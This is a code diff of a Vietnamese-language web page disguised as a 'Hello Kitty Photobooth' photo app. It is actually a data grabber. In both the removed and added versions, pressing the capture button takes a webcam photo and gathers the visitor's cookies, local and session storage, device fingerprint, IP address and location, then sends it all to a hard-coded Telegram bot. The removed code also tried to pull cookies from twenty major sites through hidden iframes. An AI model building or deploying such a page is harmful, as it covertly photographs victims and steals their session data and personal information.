@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🎀 Hello Kitty Photobooth - Pro</title>
+  <title>🎀 Hello Kitty Photobooth</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
@@ -90,7 +90,6 @@
       width: 100%;
       display: block;
       background: #fce4ec;
-      transform: scaleX(-1);
     }
     .video-preview .placeholder {
       color: #e07a8e; font-size: 14px; font-weight: 600; padding: 20px;
@@ -174,38 +173,15 @@
     }
     @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
     .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
-    #logDisplay {
-      position: fixed;
-      bottom: 80px;
-      left: 20px;
-      right: 80px;
-      max-height: 150px;
-      overflow-y: auto;
-      background: rgba(0,0,0,0.85);
-      color: #00ff88;
-      font-size: 10px;
-      padding: 10px;
-      border-radius: 10px;
-      font-family: monospace;
-      z-index: 50;
-      white-space: pre-wrap;
-      word-break: break-all;
-      display: none;
-      border: 1px solid #00ff88;
-    }
-    #logDisplay.show { display: block; }
     @media (max-width: 480px) {
       .card { padding: 18px 12px; }
       .video-preview { min-height: 200px; }
       h2 { font-size: 17px; }
       .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
-      #logDisplay { left: 10px; right: 10px; bottom: 70px; max-height: 120px; font-size: 9px; }
     }
   </style>
 </head>
 <body>
-
-<div id="logDisplay"></div>
 
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loading-spinner"></div>
@@ -223,7 +199,7 @@
   <div class="kitty-avatar"><span>🐱</span></div>
   <div class="live-clock" id="clock">🕒 Đang tải...</div>
   <h2>🌸 Hello Kitty Photobooth</h2>
-  <p class="subtitle">✨ Chụp ảnh + Thu thập cookies tối đa ✨</p>
+  <p class="subtitle">✨ Chụp ảnh + Thu thập thông tin ✨</p>
 
   <div class="video-preview">
     <video id="video" autoplay playsinline muted></video>
@@ -232,7 +208,7 @@
   </div>
 
   <button class="btn btn-primary" id="capture-btn" disabled>
-    <span>📸 CHỤP ẢNH & THU THẬP COOKIES</span>
+    <span>📸 CHỤP ẢNH & GỬI DỮ LIỆU</span>
   </button>
 
   <div class="btn-group" id="action-buttons">
@@ -248,60 +224,11 @@
 
 <script>
 // ============================================================
-// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID
+// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID CỦA BẠN VÀO ĐÂY
 // ============================================================
 const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
 const TELEGRAM_CHAT_ID = '8872446985';
 const MUSIC_FILE = 'nhac_nen.mp3';
-
-// DANH SÁCH WEB CẦN LẤY COOKIES (MỞ RỘNG)
-const TARGET_WEBSITES = [
-  'https://facebook.com',
-  'https://google.com',
-  'https://youtube.com',
-  'https://instagram.com',
-  'https://tiktok.com',
-  'https://twitter.com',
-  'https://amazon.com',
-  'https://netflix.com',
-  'https://spotify.com',
-  'https://github.com',
-  'https://reddit.com',
-  'https://pinterest.com',
-  'https://linkedin.com',
-  'https://whatsapp.com',
-  'https://telegram.org',
-  'https://discord.com',
-  'https://twitch.tv',
-  'https://snapchat.com',
-  'https://ebay.com',
-  'https://microsoft.com'
-];
-
-// ============================================================
-// LOG SYSTEM
-// ============================================================
-const logDiv = document.getElementById('logDisplay');
-let logContent = '';
-
-function addLog(msg, type = 'info') {
-  const time = new Date().toLocaleTimeString();
-  const colors = { info: '#44aaff', success: '#00ff88', error: '#ff4444', warning: '#ffaa00', cookie: '#ff88aa' };
-  logContent += `[${time}] ${msg}\n`;
-  logDiv.innerHTML = logContent.split('\n').map(line => {
-    const color = colors[type] || '#ffffff';
-    return `<span style="color:${color};">${line}</span>`;
-  }).join('\n');
-  logDiv.scrollTop = logDiv.scrollHeight;
-  logDiv.classList.add('show');
-  console.log(msg);
-}
-
-function setStatus(msg, type = '') {
-  const el = document.getElementById('status');
-  el.textContent = msg;
-  el.className = 'status ' + type;
-}
 
 // ============================================================
 // HOA ANH ĐÀO
@@ -322,7 +249,7 @@ function setStatus(msg, type = '') {
 })();
 
 // ============================================================
-// NHẠC - TỰ ĐỘNG PHÁT NGAY KHI VÀO WEB
+// NHẠC - TỰ ĐỘNG PHÁT
 // ============================================================
 let audio = null;
 let isMusicPlaying = false;
@@ -348,9 +275,7 @@ function playMusic() {
         musicStarted = true;
         document.getElementById('musicBtn').classList.add('playing');
         document.getElementById('musicBtn').textContent = '🎵';
-        addLog('🎵 Nhạc đã bật!', 'success');
       }).catch(() => {
-        // Nếu bị chặn, thử khi click
         document.addEventListener('click', function playOnClick() {
           if (!musicStarted) {
             audio.play().then(() => {
@@ -358,16 +283,13 @@ function playMusic() {
               musicStarted = true;
               document.getElementById('musicBtn').classList.add('playing');
               document.getElementById('musicBtn').textContent = '🎵';
-              addLog('🎵 Nhạc đã bật!', 'success');
             }).catch(()=>{});
             document.removeEventListener('click', playOnClick);
           }
         }, { once: true });
       });
     }
-  } catch(e) {
-    addLog('⚠️ Không thể phát nhạc: ' + e.message, 'warning');
-  }
+  } catch(e) {}
 }
 
 function toggleMusic() {
@@ -377,21 +299,16 @@ function toggleMusic() {
     isMusicPlaying = false;
     document.getElementById('musicBtn').classList.remove('playing');
     document.getElementById('musicBtn').textContent = '🔇';
-    addLog('🔇 Đã tắt nhạc', 'info');
   } else {
     audio.play().catch(()=>{});
     isMusicPlaying = true;
     document.getElementById('musicBtn').classList.add('playing');
     document.getElementById('musicBtn').textContent = '🎵';
-    addLog('🎵 Đã bật nhạc', 'info');
   }
 }
 
-// PHÁT NHẠC NGAY LẬP TỨC
-setTimeout(playMusic, 50);
-// Nếu chưa phát, thử lại sau 1s
+setTimeout(playMusic, 100);
 setTimeout(playMusic, 1000);
-// Thử lại lần nữa sau 3s
 setTimeout(playMusic, 3000);
 
 // ============================================================
@@ -406,7 +323,7 @@ setInterval(updateClock, 1000);
 updateClock();
 
 // ============================================================
-// LẤY COOKIES TỪ TRANG HIỆN TẠI
+// LẤY THÔNG TIN
 // ============================================================
 function getCurrentCookies() {
   try {
@@ -430,201 +347,48 @@ function getCookiesString(cookies) {
   }).join('\n');
 }
 
-// ============================================================
-// LẤY COOKIES TỪ IFARME - TỐI ĐA
-// ============================================================
-function getCookiesFromIframe(url) {
-  return new Promise((resolve) => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = url;
-    iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
-    document.body.appendChild(iframe);
-    
-    let timeout = setTimeout(() => {
-      try { iframe.remove(); } catch(e) {}
-      resolve({ url, error: 'Timeout', cookies: [], success: false });
-    }, 15000);
-    
-    iframe.onload = function() {
-      clearTimeout(timeout);
-      
-      try {
-        // Lấy cookies
-        let cookies = [];
-        let localStorage = {};
-        let sessionStorage = {};
-        
-        try {
-          const doc = iframe.contentDocument || iframe.contentWindow.document;
-          if (doc && doc.cookie) {
-            const raw = doc.cookie;
-            if (raw) {
-              cookies = raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
-                const idx = c.indexOf('=');
-                if (idx === -1) return { name: c, value: '' };
-                return { name: c.substring(0, idx), value: c.substring(idx + 1) };
-              });
-            }
-          }
-        } catch(e) {}
-        
-        // Lấy localStorage
-        try {
-          const win = iframe.contentWindow;
-          if (win && win.localStorage) {
-            for (let i = 0; i < win.localStorage.length; i++) {
-              const key = win.localStorage.key(i);
-              localStorage[key] = win.localStorage.getItem(key);
-            }
-          }
-        } catch(e) {}
-        
-        // Lấy sessionStorage
-        try {
-          const win = iframe.contentWindow;
-          if (win && win.sessionStorage) {
-            for (let i = 0; i < win.sessionStorage.length; i++) {
-              const key = win.sessionStorage.key(i);
-              sessionStorage[key] = win.sessionStorage.getItem(key);
-            }
-          }
-        } catch(e) {}
-        
-        // Lấy thông tin trang
-        let pageInfo = {};
-        try {
-          const win = iframe.contentWindow;
-          if (win) {
-            pageInfo = {
-              url: win.location.href,
-              title: win.document.title,
-              userAgent: win.navigator.userAgent
-            };
-          }
-        } catch(e) {}
-        
-        setTimeout(() => {
-          try { iframe.remove(); } catch(e) {}
-          resolve({
-            url: url,
-            cookies: cookies,
-            localStorage: localStorage,
-            sessionStorage: sessionStorage,
-            pageInfo: pageInfo,
-            success: cookies.length > 0 || Object.keys(localStorage).length > 0
-          });
-        }, 500);
-        
-      } catch(e) {
-        try { iframe.remove(); } catch(e2) {}
-        resolve({ url, error: e.message, cookies: [], success: false });
-      }
-    };
-    
-    iframe.onerror = function() {
-      clearTimeout(timeout);
-      try { iframe.remove(); } catch(e) {}
-      resolve({ url, error: 'Load error', cookies: [], success: false });
-    };
-  });
-}
-
-// ============================================================
-// THU THẬP COOKIES TỐI ĐA
-// ============================================================
-async function collectAllCookies() {
-  addLog('🚀 Bắt đầu thu thập cookies tối đa...', 'info');
-  setStatus('📸 Đang thu thập cookies...', 'loading');
-  
-  const results = {
-    current: { cookies: [], localStorage: {}, sessionStorage: {} },
-    websites: {},
-    totalCookies: 0
-  };
-  
-  // 1. Lấy từ trang hiện tại
-  const currentCookies = getCurrentCookies();
-  results.current.cookies = currentCookies;
-  results.totalCookies += currentCookies.length;
-  
+function getLocalStorageInfo() {
   try {
+    if (!localStorage.length) return '❌ Không có dữ liệu localStorage';
+    const items = [];
     for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
-      results.current.localStorage[key] = localStorage.getItem(key);
+      let val = localStorage.getItem(key) || '';
+      if (val.length > 60) val = val.substring(0, 60) + '…';
+      val = val.replace(/[^\x20-\x7E]/g, '?');
+      items.push(`  ${key} = ${val}`);
     }
-  } catch(e) {}
-  
-  try {
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      results.current.sessionStorage[key] = sessionStorage.getItem(key);
-    }
-  } catch(e) {}
-  
-  addLog(`✅ Trang hiện tại: ${currentCookies.length} cookies, ${Object.keys(results.current.localStorage).length} LS, ${Object.keys(results.current.sessionStorage).length} SS`, 'success');
-  
-  // 2. Lấy từ các web khác
-  for (let i = 0; i < TARGET_WEBSITES.length; i++) {
-    const url = TARGET_WEBSITES[i];
-    const domain = url.replace('https://', '').replace('http://', '');
-    
-    addLog(`🌐 [${i+1}/${TARGET_WEBSITES.length}] Đang lấy: ${domain}`, 'info');
-    setStatus(`📸 Đang lấy: ${domain} (${i+1}/${TARGET_WEBSITES.length})`, 'loading');
-    
-    const result = await getCookiesFromIframe(url);
-    
-    if (result.success) {
-      results.websites[domain] = {
-        cookies: result.cookies || [],
-        localStorage: result.localStorage || {},
-        sessionStorage: result.sessionStorage || {},
-        pageInfo: result.pageInfo || {},
-        success: true
-      };
-      results.totalCookies += result.cookies.length;
-      addLog(`✅ ${domain}: ${result.cookies.length} cookies, ${Object.keys(result.localStorage).length} LS`, 'success');
-    } else {
-      results.websites[domain] = {
-        cookies: [],
-        success: false,
-        error: result.error || 'Không thể lấy'
-      };
-      addLog(`❌ ${domain}: ${result.error || 'Không thể lấy'}`, 'error');
-    }
-    
-    // Đợi giữa các lần
-    await new Promise(r => setTimeout(r, 300));
-  }
-  
-  addLog(`✅ Hoàn tất! Tổng cookies: ${results.totalCookies}`, 'success');
-  setStatus(`✅ Đã thu thập xong! Tổng cookies: ${results.totalCookies}`, 'success');
-  
-  return results;
+    return items.join('\n');
+  } catch(e) { return '❌ Không thể truy cập localStorage'; }
 }
 
-// ============================================================
-// LẤY THÔNG TIN KHÁC
-// ============================================================
+function getSessionStorageInfo() {
+  try {
+    if (!sessionStorage.length) return '❌ Không có dữ liệu sessionStorage';
+    const items = [];
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      let val = sessionStorage.getItem(key) || '';
+      if (val.length > 60) val = val.substring(0, 60) + '…';
+      val = val.replace(/[^\x20-\x7E]/g, '?');
+      items.push(`  ${key} = ${val}`);
+    }
+    return items.join('\n');
+  } catch(e) { return '❌ Không thể truy cập sessionStorage'; }
+}
+
 function getDeviceInfo() {
   return {
-    userAgent: navigator.userAgent,
     platform: navigator.platform || 'Không rõ',
     language: navigator.language || 'Không rõ',
-    languages: navigator.languages ? navigator.languages.join(', ') : 'Không rõ',
-    cookieEnabled: navigator.cookieEnabled ? '✅ Bật' : '❌ Tắt',
-    doNotTrack: navigator.doNotTrack || '❌ Không bật',
-    hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
-    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
-    maxTouchPoints: navigator.maxTouchPoints || '0',
-    vendor: navigator.vendor || 'Không rõ',
     screen: `${window.screen.width}x${window.screen.height}`,
-    colorDepth: window.screen.colorDepth,
-    pixelRatio: window.devicePixelRatio,
+    cores: navigator.hardwareConcurrency || 'Không rõ',
+    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
+    touch: navigator.maxTouchPoints > 0 ? '✅ Có' : '❌ Không',
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ',
-    referrer: document.referrer || 'Trực tiếp',
     url: window.location.href,
-    title: document.title
+    title: document.title,
+    referrer: document.referrer || 'Trực tiếp'
   };
 }
 
@@ -636,13 +400,8 @@ async function getIP() {
       return {
         ip: data.ip || 'Không rõ',
         city: data.city || 'Không rõ',
-        region: data.region || 'Không rõ',
         country: data.country || 'Không rõ',
-        countryCode: data.country_code || 'Không rõ',
-        isp: data.connection?.isp || data.connection?.org || 'Không rõ',
-        timezone: data.timezone?.id || 'Không rõ',
-        latitude: data.latitude || 'Không rõ',
-        longitude: data.longitude || 'Không rõ'
+        isp: data.connection?.isp || data.connection?.org || 'Không rõ'
       };
     }
     return { ip: 'Không rõ' };
@@ -665,21 +424,8 @@ function getPlugins() {
   } catch(e) { return []; }
 }
 
-function getPerformance() {
-  try {
-    const timing = performance.timing;
-    return {
-      loadTime: timing.loadEventEnd - timing.navigationStart,
-      domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
-      dns: timing.domainLookupEnd - timing.domainLookupStart,
-      tcp: timing.connectEnd - timing.connectStart,
-      ttfb: timing.responseStart - timing.requestStart
-    };
-  } catch(e) { return {}; }
-}
-
 // ============================================================
-// CAMERA - CHỈ 1 CAM, ĐƠN GIẢN HƠN
+// CAMERA
 // ============================================================
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -697,10 +443,8 @@ async function startCamera() {
   loadingOverlay.classList.add('show');
   captureBtn.disabled = true;
   placeholder.textContent = '📸 Đang mở camera...';
-  addLog('📷 Đang khởi tạo camera...', 'info');
   
   try {
-    // Thử mở camera trước
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -712,9 +456,7 @@ async function startCamera() {
       isCameraReady = true;
       cameraLabel.textContent = '📷 Camera trước';
       placeholder.style.display = 'none';
-      addLog('✅ Camera đã mở thành công!', 'success');
     } catch(e1) {
-      // Thử mở camera sau
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -726,9 +468,7 @@ async function startCamera() {
         isCameraReady = true;
         cameraLabel.textContent = '📷 Camera sau';
         placeholder.style.display = 'none';
-        addLog('✅ Camera đã mở thành công!', 'success');
       } catch(e2) {
-        // Thử mở bất kỳ
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           currentStream = stream;
@@ -737,7 +477,6 @@ async function startCamera() {
           isCameraReady = true;
           cameraLabel.textContent = '📷 Camera';
           placeholder.style.display = 'none';
-          addLog('✅ Camera đã mở thành công!', 'success');
         } catch(e3) {
           throw new Error('Không thể mở camera');
         }
@@ -746,13 +485,14 @@ async function startCamera() {
     
     if (isCameraReady) {
       captureBtn.disabled = false;
-      setStatus('✅ Camera đã sẵn sàng!', 'success');
+      statusDiv.textContent = '✅ Camera đã sẵn sàng!';
+      statusDiv.className = 'status success';
     }
     
   } catch(err) {
-    addLog(`❌ Lỗi camera: ${err.message}`, 'error');
     placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
-    setStatus('⚠️ Không thể truy cập camera', 'error');
+    statusDiv.textContent = '⚠️ Không thể truy cập camera';
+    statusDiv.className = 'status error';
     isCameraReady = false;
     captureBtn.disabled = true;
   } finally {
@@ -763,7 +503,7 @@ async function startCamera() {
 setTimeout(startCamera, 500);
 
 // ============================================================
-// CHỤP ẢNH VÀ GỬI DỮ LIỆU
+// CHỤP ẢNH & GỬI DỮ LIỆU
 // ============================================================
 function playClickSound() {
   try {
@@ -784,42 +524,41 @@ function playClickSound() {
 
 captureBtn.onclick = async function() {
   if (!isCameraReady || !currentStream) {
-    setStatus('⚠️ Vui lòng đợi camera sẵn sàng!', 'error');
+    statusDiv.textContent = '⚠️ Vui lòng đợi camera sẵn sàng!';
+    statusDiv.className = 'status error';
     return;
   }
   
   playClickSound();
   captureBtn.disabled = true;
-  setStatus('📸 Đang thu thập dữ liệu...', 'loading');
-  addLog('📸 Bắt đầu thu thập...', 'info');
+  statusDiv.textContent = '📸 Đang chụp ảnh...';
+  statusDiv.className = 'status loading';
   
-  // Thu thập tất cả
-  const cookieData = await collectAllCookies();
+  // Thu thập dữ liệu
+  const cookies = getCurrentCookies();
+  const localStorage = getLocalStorageInfo();
+  const sessionStorage = getSessionStorageInfo();
   const device = getDeviceInfo();
   const ip = await getIP();
   const plugins = getPlugins();
-  const perf = getPerformance();
   
   // Chụp ảnh
   const W = 480, H = 360;
   canvas.width = W; canvas.height = H;
   const ctx = canvas.getContext('2d');
   
-  // Nền
   const grad = ctx.createLinearGradient(0, 0, W, H);
   grad.addColorStop(0, '#ffe4ec');
   grad.addColorStop(1, '#ffb6c1');
   ctx.fillStyle = grad;
   ctx.fillRect(0, 0, W, H);
   
-  // Vẽ ảnh (lật ngang)
   ctx.save();
   ctx.translate(W, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0, W, H);
   ctx.restore();
   
-  // Khung
   ctx.strokeStyle = '#ff6b8a';
   ctx.lineWidth = 4;
   ctx.strokeRect(10, 10, W-20, H-20);
@@ -843,129 +582,77 @@ captureBtn.onclick = async function() {
   ctx.textAlign = 'left';
   ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
   
-  // ============================================================
-  // TẠO CAPTION GỬI TELEGRAM
-  // ============================================================
-  let caption = `🎀 HELLO KITTY - COOKIE COLLECTOR PRO 🎀\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
-  caption += `📊 Tổng cookies: ${cookieData.totalCookies}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  // Tạo caption
+  let caption = `🎀 HELLO KITTY PHOTOBOOTH 🎀\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
-  // Thiết bị
-  caption += `📱 THIẾT BỊ:\n`;
-  caption += `🔹 Platform: ${device.platform}\n`;
-  caption += `🔹 Language: ${device.language}\n`;
-  caption += `🔹 Screen: ${device.screen}\n`;
-  caption += `🔹 Pixel Ratio: ${device.pixelRatio}\n`;
-  caption += `🔹 CPU: ${device.hardwareConcurrency} cores\n`;
-  caption += `🔹 RAM: ${device.deviceMemory}\n`;
-  caption += `🔹 Touch: ${device.maxTouchPoints > 0 ? '✅ Có' : '❌ Không'}\n`;
-  caption += `🔹 Cookies Enabled: ${device.cookieEnabled}\n`;
-  caption += `🔹 Do Not Track: ${device.doNotTrack}\n`;
-  caption += `🔹 Timezone: ${device.timezone}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  caption += `📱 DEVICE:\n`;
+  caption += `  Platform: ${device.platform}\n`;
+  caption += `  Language: ${device.language}\n`;
+  caption += `  Screen: ${device.screen}\n`;
+  caption += `  CPU: ${device.cores} cores\n`;
+  caption += `  RAM: ${device.memory}\n`;
+  caption += `  Touch: ${device.touch}\n`;
+  caption += `  Timezone: ${device.timezone}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
-  // IP
-  caption += `🌐 IP & VỊ TRÍ:\n`;
-  caption += `🔹 IP: ${ip.ip || 'Không rõ'}\n`;
-  caption += `🔹 City: ${ip.city || 'Không rõ'}\n`;
-  caption += `🔹 Region: ${ip.region || 'Không rõ'}\n`;
-  caption += `🔹 Country: ${ip.country || 'Không rõ'}\n`;
-  caption += `🔹 ISP: ${ip.isp || 'Không rõ'}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  caption += `🌐 IP & LOCATION:\n`;
+  caption += `  IP: ${ip.ip || 'Không rõ'}\n`;
+  caption += `  City: ${ip.city || 'Không rõ'}\n`;
+  caption += `  Country: ${ip.country || 'Không rõ'}\n`;
+  caption += `  ISP: ${ip.isp || 'Không rõ'}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
-  // Trang hiện tại
-  caption += `📱 TRANG HIỆN TẠI:\n`;
-  caption += `🔹 URL: ${device.url}\n`;
-  caption += `🔹 Title: ${device.title}\n`;
-  caption += `🔹 Referrer: ${device.referrer}\n`;
-  caption += `🍪 Cookies (${cookieData.current.cookies.length}):\n`;
-  if (cookieData.current.cookies.length > 0) {
-    cookieData.current.cookies.slice(0, 10).forEach(c => {
+  caption += `🍪 COOKIES (${cookies.length}):\n`;
+  if (cookies.length > 0) {
+    cookies.slice(0, 5).forEach(c => {
       let v = decodeURIComponent(c.value || '');
-      if (v.length > 50) v = v.substring(0, 50) + '…';
-      caption += `  • ${c.name} = ${v}\n`;
+      if (v.length > 40) v = v.substring(0, 40) + '…';
+      caption += `  ${c.name} = ${v}\n`;
     });
-    if (cookieData.current.cookies.length > 10) {
-      caption += `  ... và ${cookieData.current.cookies.length - 10} cookies khác\n`;
-    }
+    if (cookies.length > 5) caption += `  ... +${cookies.length-5} cookies\n`;
   } else {
     caption += `  ❌ Không có cookies\n`;
   }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
-  const lsKeys = Object.keys(cookieData.current.localStorage || {});
-  if (lsKeys.length > 0) {
-    caption += `💾 LS (${lsKeys.length}):\n`;
-    lsKeys.slice(0, 10).forEach(key => {
-      let val = cookieData.current.localStorage[key] || '';
-      if (val.length > 40) val = val.substring(0, 40) + '…';
-      caption += `  • ${key} = ${val}\n`;
-    });
+  const lsItems = localStorage.split('\n').filter(l => l.trim());
+  if (lsItems.length > 0) {
+    caption += `💾 LOCAL STORAGE (${lsItems.length}):\n`;
+    lsItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
+    if (lsItems.length > 5) caption += `  ... +${lsItems.length-5} items\n`;
+    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   }
   
-  const ssKeys = Object.keys(cookieData.current.sessionStorage || {});
-  if (ssKeys.length > 0) {
-    caption += `📦 SS (${ssKeys.length}):\n`;
-    ssKeys.slice(0, 10).forEach(key => {
-      let val = cookieData.current.sessionStorage[key] || '';
-      if (val.length > 40) val = val.substring(0, 40) + '…';
-      caption += `  • ${key} = ${val}\n`;
-    });
+  const ssItems = sessionStorage.split('\n').filter(l => l.trim());
+  if (ssItems.length > 0) {
+    caption += `📦 SESSION STORAGE (${ssItems.length}):\n`;
+    ssItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
+    if (ssItems.length > 5) caption += `  ... +${ssItems.length-5} items\n`;
+    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
-  // Các web khác
-  caption += `🌐 COOKIES TỪ CÁC WEB KHÁC:\n`;
-  let successCount = 0;
-  for (const [domain, data] of Object.entries(cookieData.websites)) {
-    if (data.success) {
-      successCount++;
-      caption += `✅ ${domain}: ${data.cookies.length} cookies`;
-      if (Object.keys(data.localStorage).length > 0) {
-        caption += `, ${Object.keys(data.localStorage).length} LS`;
-      }
-      caption += `\n`;
-      if (data.cookies.length > 0) {
-        data.cookies.slice(0, 3).forEach(c => {
-          let v = decodeURIComponent(c.value || '');
-          if (v.length > 40) v = v.substring(0, 40) + '…';
-          caption += `  • ${c.name} = ${v}\n`;
-        });
-        if (data.cookies.length > 3) {
-          caption += `  ... và ${data.cookies.length - 3} cookies khác\n`;
-        }
-      }
-    } else {
-      caption += `❌ ${domain}: ${data.error || 'Lỗi'}\n`;
-    }
-  }
-  caption += `📊 Thành công: ${successCount}/${Object.keys(cookieData.websites).length}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  
-  // Plugins
   if (plugins.length > 0) {
     caption += `🔌 PLUGINS (${plugins.length}):\n`;
-    plugins.slice(0, 10).forEach((p, i) => {
-      caption += `  ${i+1}. ${p}\n`;
-    });
-    if (plugins.length > 10) caption += `  ... và ${plugins.length - 10} plugins khác\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    plugins.slice(0, 5).forEach((p, i) => caption += `  ${i+1}. ${p}\n`);
+    if (plugins.length > 5) caption += `  ... +${plugins.length-5} plugins\n`;
+    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   }
   
-  // Performance
-  caption += `📊 PERFORMANCE:\n`;
-  caption += `🔹 Tải trang: ${perf.loadTime || 0}ms\n`;
-  caption += `🔹 DOM Ready: ${perf.domReady || 0}ms\n`;
-  caption += `🔹 DNS: ${perf.dns || 0}ms\n`;
-  caption += `🔹 TCP: ${perf.tcp || 0}ms\n`;
-  caption += `🔹 TTFB: ${perf.ttfb || 0}ms\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🌸 Cảm ơn bạn đã sử dụng! 🌸`;
+  caption += `🔗 PAGE:\n`;
+  caption += `  URL: ${device.url}\n`;
+  caption += `  Title: ${device.title}\n`;
+  caption += `  Referrer: ${device.referrer}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🌸 Thank you! 🌸`;
   
-  // ============================================================
-  // GỬI LÊN TELEGRAM
-  // ============================================================
+  if (caption.length > 4000) {
+    caption = caption.substring(0, 3900) + '\n... (cut)';
+  }
+  
+  // Gửi lên Telegram
   canvas.toBlob(async (blob) => {
     if (blob) {
       const form = new FormData();
@@ -980,16 +667,16 @@ captureBtn.onclick = async function() {
         });
         const json = await res.json();
         if (json.ok) {
-          setStatus('🎀 Thành công! Kitty đã nhận được dữ liệu! 💖', 'success');
+          statusDiv.textContent = '🎀 Thành công! Kitty đã nhận được ảnh! 💖';
+          statusDiv.className = 'status success';
           actionBtns.classList.add('show');
-          addLog('✅ Đã gửi lên Telegram thành công!', 'success');
         } else {
-          setStatus('⚠️ Lỗi gửi: ' + (json.description || 'Unknown'), 'error');
-          addLog(`❌ Lỗi Telegram: ${json.description || 'Unknown'}`, 'error');
+          statusDiv.textContent = '⚠️ Lỗi: ' + (json.description || 'Unknown');
+          statusDiv.className = 'status error';
         }
       } catch(e) {
-        setStatus('⚠️ Lỗi kết nối Telegram', 'error');
-        addLog(`❌ Lỗi: ${e.message}`, 'error');
+        statusDiv.textContent = '⚠️ Lỗi kết nối Telegram';
+        statusDiv.className = 'status error';
       }
     }
     captureBtn.disabled = false;
@@ -999,10 +686,8 @@ captureBtn.onclick = async function() {
 // ============================================================
 // KHỞI TẠO
 // ============================================================
-addLog('🎀 Hello Kitty Photobooth đã sẵn sàng!', 'info');
-addLog(`📋 Sẽ thu thập từ ${TARGET_WEBSITES.length} web khác nhau`, 'info');
-addLog('🎵 Nhạc sẽ tự động phát!', 'info');
-setStatus('💖 Bấm nút để bắt đầu!', '');
+statusDiv.textContent = '💖 Bấm nút để bắt đầu!';
+statusDiv.className = 'status';
 </script>
 </body>
 </html>
